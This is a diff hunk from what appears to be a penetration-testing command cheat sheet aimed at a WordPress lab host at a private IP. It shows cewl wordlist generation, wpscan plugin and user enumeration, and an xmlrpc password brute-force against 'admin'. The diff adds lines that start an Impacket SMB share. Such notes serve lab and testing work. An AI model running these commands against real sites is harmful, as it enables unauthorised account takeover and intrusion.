@@ -83,3 +83,5 @@ cewl http://192.168.10.10/ > dictionnary.txt
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-detection aggressive
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --enumerate u
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+smbserver.py SHUTDOWN .
+smbserver.py -smb2support SHUTDOWN .
